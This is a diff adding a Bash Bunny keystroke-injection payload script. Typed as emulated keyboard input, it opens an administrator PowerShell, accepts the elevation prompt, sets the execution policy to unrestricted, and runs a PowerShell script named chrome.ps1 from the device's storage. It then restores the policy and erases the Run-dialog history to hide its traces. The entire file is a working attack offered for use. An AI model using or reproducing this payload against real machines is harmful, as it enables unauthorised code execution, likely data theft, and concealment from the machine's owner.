@@ -1,0 +1,52 @@
+# System default payload
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+source bunny_helpers.sh 
+Q DELAY 6000
+
+#Start the attack
+LED ATTACK
+Q REM Open an admin command prompt
+Q GUI r
+Q DELAY 500
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+Q DELAY 2000
+Q ALT y
+Q DELAY 1000
+
+#Stage 2, save and change execution policy
+LED STAGE2
+Q STRING \$execPolicy = Get-ExecutionPolicy
+Q ENTER
+Q DELAY 500
+Q STRING Set-ExecutionPolicy unrestricted
+Q ENTER
+Q DELAY 1000
+Q STRING A
+Q ENTER
+Q DELAY 1000
+
+#Stage 3, run the code
+LED STAGE3
+Q STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\chrome.ps1')"
+Q ENTER
+Q DELAY 2000
+
+#Cleanup and revert
+LED CLEANUP
+Q STRING Set-ExecutionPolicy \$execPolicy
+Q ENTER
+Q DELAY 1000
+Q STRING A
+Q ENTER
+Q DELAY 1000
+Q STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+Q ENTER
+Q DELAY 1000
+Q STRING exit
+Q ENTER
+
+#Finish
+LED FINISH
